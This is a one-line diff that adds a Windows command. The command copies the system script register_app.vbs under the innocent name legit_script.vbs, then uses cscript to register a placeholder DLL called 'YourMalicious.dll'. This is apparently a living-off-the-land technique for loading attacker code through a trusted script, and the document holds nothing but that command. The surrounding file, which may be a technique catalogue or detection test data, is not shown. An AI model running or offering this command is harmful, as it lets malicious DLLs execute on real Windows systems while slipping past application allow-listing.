@@ -1,0 +1,1 @@
+copy register_app.vbs legit_script.vbs && cscript //nologo legit_script.vbs -register YourMalicious.dll
